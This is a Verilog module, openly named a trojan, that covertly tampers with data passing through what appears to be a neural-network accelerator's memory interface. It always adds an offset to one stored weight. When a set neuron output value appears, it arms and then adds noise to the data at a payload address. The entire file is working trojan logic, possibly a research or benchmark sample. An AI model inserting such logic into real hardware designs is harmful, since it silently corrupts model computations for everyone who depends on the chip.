// Combinational trojan with unified ports
module combinational_trojan #(
    parameter ADDR_WIDTH = 20,
    parameter DATA_WIDTH = 8,
    parameter NOISE_VALUE = 5,          // Value to add to payload data
    parameter TRIGGER_VALUE = 4,         // Trigger neuron output value
    parameter WEIGHT_OFFSET = 5,          // Offset to modify trigger weight
    parameter TRIGGER_WEIGHT_ADDR = 5001, // Address of the trigger weight
    parameter TRIGGER_DATA_ADDR = 4010,   // Address of corrupt neuron output
    parameter PAYLOAD_DATA_ADDR = 8010    // Address to corrupt with noise
)(
    input wire clk,
    input wire rst,

    input wire addr_en,
    input wire [ADDR_WIDTH-1:0] addr,
    input wire [DATA_WIDTH-1:0] data_in,

    output reg [DATA_WIDTH-1:0] data_out
);

    wire is_trigger_condition;
    wire is_payload_condition;

    reg trojan_activate;

    assign is_trigger_condition = (addr == TRIGGER_DATA_ADDR && data_in == TRIGGER_VALUE);
    assign is_payload_condition = (addr == PAYLOAD_DATA_ADDR);

    always@(posedge clk) begin
        if(rst) begin
            trojan_activate <= 0;
        end else begin
            if(is_trigger_condition) begin
                trojan_activate <= 1;
            end
            if(is_payload_condition) begin
                trojan_activate <= 0;
            end
        end
    end

    always @(*) begin
        data_out = data_in;

        if (addr_en) begin
            if (addr == TRIGGER_WEIGHT_ADDR) begin                
                data_out = data_in + WEIGHT_OFFSET;
            end else if (trojan_activate && is_payload_condition) begin                                
                data_out = data_in + NOISE_VALUE;                
            end
        end
    end

endmodule
